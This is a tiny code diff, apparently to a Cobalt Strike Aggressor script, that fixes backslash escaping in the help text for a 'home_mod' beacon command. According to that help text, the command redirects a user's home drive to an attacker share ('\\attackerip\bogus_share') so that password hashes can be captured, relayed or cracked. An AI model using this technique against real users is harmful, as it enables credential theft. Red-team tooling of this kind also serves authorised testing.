@@ -11,7 +11,7 @@ beacon_command_register(
                   relay, or crack.
 
     Usage: home_mod <username> <drive letter> <attacker share>
-    Example: home_mod jblogg N \\attackerip\bogus_share");
+    Example: home_mod jblogg N \\\\attackerip\\bogus_share");
 
 
 alias home_mod{
